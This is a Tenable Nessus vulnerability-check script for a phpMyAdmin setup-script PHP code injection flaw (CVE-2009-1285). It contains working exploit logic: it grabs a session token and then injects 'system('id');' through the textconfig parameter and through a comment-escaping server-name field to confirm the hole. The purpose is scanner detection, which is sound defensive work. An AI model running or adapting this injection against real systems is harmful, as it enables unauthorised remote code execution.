#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(36171);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/05/16 14:22:06 $");

  script_cve_id("CVE-2009-1285");
  script_bugtraq_id(34526);
  script_osvdb_id(53685, 127468);
  script_xref(name:"TRA", value:"TRA-2009-02");
  script_xref(name:"Secunia", value:"34727");

  script_name(english:"phpMyAdmin Setup Script Configuration Parameters Arbitrary PHP Code Injection (PMASA-2009-4)");
  script_summary(english:"Attempts to inject PHP code into config file.");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server contains a PHP application that is affected by a
code execution vulnerability.");
  script_set_attribute( attribute:"description",  value:
"The setup script included with the version of phpMyAdmin installed on
the remote host does not properly sanitize user-supplied input before
using it to generate a config file for the application. This version
is affected by the following vulnerabilities :

  - The setup script inserts the unsanitized verbose server 
    name into a C-style comment during config file 
    generation.

  - An attacker can save arbitrary data to the generated 
    config file by altering the value of the 'textconfig' 
    parameter during a POST request to config.php.

An unauthenticated, remote attacker can exploit these issues to
execute arbitrary PHP code.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2009-02");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2009-4.php");
  script_set_attribute( attribute:"solution",  value:
"Upgrade to phpMyAdmin 3.1.3.2. Alternatively, apply the patches
referenced in the project's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(94);
  script_set_attribute(attribute:"plugin_publication_date", value: "2009/04/16");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded:FALSE, php:TRUE);

# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (isnull(matches)) exit(0);

pma_dir = matches[2];
injected_code = "system('id');";
eoltype = "unix";

function get_token()
{
  local_var dir, token, url, res, pat, match, item;
  dir = _FCT_ANON_ARGS[0];
  token = NULL;

  if (isnull(dir)) return NULL;

  url = string(dir, "/setup/index.php");
  
  clear_cookiejar();
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
  
  # Extract the token.
  token = NULL;
  
  pat = 'input type="hidden" name="token" value="([^"]+)"';
  matches = egrep(string:res[2], pattern:pat);
  if (matches)
  {
    foreach match (split(matches, keep:FALSE))
    {
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        token = item[1];
        break;
      }
    }
  }

  return token;
}

# Try the first exploit (manipulating the textconfig parameter)
token = get_token(pma_dir);
if (isnull(token)) exit(0);
postdata = string(
  "check_page_refresh=1&",
  "convcharset=utf-8&",
  "token=", token, "&",
  "eoltype=", eoltype, "&",
  "textconfig=", injected_code, "&",
  "submit_download=Download"
);
        
url = string(pma_dir, "/setup/config.php?type=post");
req = http_mk_post_req(
  port        : port,
  item        : url,
  data        : postdata,
  add_headers : make_array(
    "Content-Type", "application/x-www-form-urlencoded"
  )
);
  
res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

if (res[2] == injected_code)
{
  security_hole(port);
  exit(0);
}

# If that exploit didn't work, try using the comment injection exploit
token = get_token(pma_dir);
if (isnull(token)) exit(0);

# First, get the "add a new server" form...
url = string(
  pma_dir, "/setup/index.php?",
  "check_page_refresh=&",
  "lang=en-utf-8&",
  "convcharset=utf-8&",
  "token=", token, "&",
  "page=servers&",
  "mode=add&",
  "submit=New+server"
);

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# ...then submit all the new server info, including the injection attack...
postdata = string(
  "check_page_refresh=&",
  "convcharset=utf-8&",
  "token=", token, "&",
  "page=servers&",
  "mode=add&",
  "submit=New+server&",
  "UploadDir=/tmp&",

"Servers-0-verbose=*/", injected_code, "/*&Servers-0-host=Nessus&Servers-0-port=&Servers-0-socket=&Servers-0-connect_type=tcp&Servers-0-extension=mysqli&Servers-0-auth_type=cookie&Servers-0-user=root&Servers-0-password=&Servers-0-auth_swekey_config=&Servers-0-SignonSession=&Servers-0-SignonURL=&Servers-0-LogoutURL=&Servers-0-only_db=&Servers-0-hide_db=&Servers-0-AllowRoot=on&Servers-0-DisableIS=on&Servers-0-AllowDeny-order=&Servers-0-AllowDeny-rules=&Servers-0-ShowDatabasesCommand=SHOW+DATABASES&Servers-0-CountTables=on&Servers-0-pmadb=&Servers-0-controluser=&Servers-0-controlpass=&Servers-0-verbose_check=on&Servers-0-bookmarktable=&Servers-0-relation=&Servers-0-table_info=&Servers-0-table_coords=&Servers-0-pdf_pages=&Servers-0-column_info=&Servers-0-history=&Servers-0-designer_coords=&submit_save=Save"
);

req = http_mk_post_req(
  port        : port,
  item        : url,
  data        : postdata,
  add_headers : make_array(
    "Content-Type", "application/x-www-form-urlencoded"
  )
);
res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

# ...and check if the injection worked
postdata = string(
  "convcharset=utf-8&",
  "token=", token, "&",
  "server[password]=&",
  "DefaultLang=es&",
  "ServerDefault=1&",
  "eol=", eoltype, "&",
  "submit_display=Display"
);
url2 = string(pma_dir, "/setup/index.php?page=config");
req = http_mk_post_req(
  port        : port,
  item        : url2,
  data        : postdata,
  add_headers : make_array(
    "Content-Type", "application/x-www-form-urlencoded"
  )
);
res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

expected_output = '/* Server: */' + injected_code + '/* [1] */';
if (expected_output >< res[2])
{
  security_hole(port);
}
